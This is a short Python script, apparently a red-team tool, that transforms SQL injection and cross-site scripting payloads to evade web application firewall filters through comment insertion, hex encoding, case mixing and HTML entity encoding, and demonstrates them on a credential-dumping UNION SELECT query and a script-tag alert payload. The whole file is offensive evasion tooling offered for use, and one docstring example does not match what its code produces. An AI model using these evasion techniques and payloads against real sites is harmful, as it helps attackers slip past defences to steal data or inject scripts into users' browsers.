import urllib.parse

class RedTeamWAFBypassEngine:
    """
    Offensive WAF Evasion & Payload Obfuscation Engine.
    Transforms raw web attack payloads (SQLi, XSS) using bypass techniques.
    """
    def __init__(self):
        pass
    
    def obfuscate_sqli_comment_insertion(self, raw_payload: str) -> str:
        """
        Replaces spaces in SQLi payload with SQL comments (/**/) 
        to bypass simple regex space-delimited signatures.
        """
        return raw_payload.replace(" ", "/**/")
    
    def obfuscate_sqli_hex(self, text: str) -> str:
        """
        Converts text payload into Hexadecimal string format (0x...)
        to bypass string literal detection rules in WAFs.
        """
        hex_encoded = "".join([hex(ord(c))[2:] for c in text])
        return f"0x{hex_encoded}"
    
    def obfuscate_xss_case_mixing(self, raw_payload: str) -> str:
        """
        Randomizes character case in HTML/JS tags to bypass case-sensitive WAF filters.
        Example: <script> -> <sCrIpt>
        """
        obfuscated = ""
        for i, char in enumerate(raw_payload):
            if i % 2 == 0:
                obfuscated += char.upper()
            else:
                obfuscated += char.lower()
        return obfuscated
    
    def obfuscate_xss_html_entity(self, raw_payload: str) -> str:
        """
        Encodes critical characters into Decimal HTML Entities to bypass cleartext tag detection.
        Example: alert(1) -> &#97;&#108;&#101;&#114;&#116;(1)
        """
        encoded = ""
        for char in raw_payload:
            encoded += f"&#{ord(char)};"
        return encoded

if __name__ == "__main__":
    print("==================================================")
    print(" OFFENSIVE WAF BYPASS & PAYLOAD OBFUSCATOR")
    print("==================================================\n")

    evasion_engine = RedTeamWAFBypassEngine()
    
    # 1. SQL Injection Obfuscation Test
    raw_sqli = "UNION SELECT username, password FROM users WHERE id = 1 OR 1=1"
    comment_sqli = evasion_engine.obfuscate_sqli_comment_insertion(raw_sqli)
    hex_sqli = evasion_engine.obfuscate_sqli_hex("admin")
    
    print("[1] SQL Inejection Onfuscation:")
    print(f" -> Raw Payload     : {raw_sqli}")
    print(f" -> Comment Inserted: {comment_sqli}")
    print(f" -> Hex Encoded String ('admin'): {hex_sqli}\n")
    
    # 2. XSS Obfuscation Test
    raw_xss = "<script>alert('XSS')</script>"
    mixed_case_xss = evasion_engine.obfuscate_xss_case_mixing(raw_xss)
    entity_xss = evasion_engine.obfuscate_xss_html_entity("alert('XSS')")
    
    print("[2] Cross-Site Scripting (XSS) Obfuscation:")
    print(f" -> Raw Payload      : {raw_xss}")
    print(f" -> Mixed Case Tag   : {mixed_case_xss}")
    print(f" -> HTML Entity Body : {entity_xss}\n")
    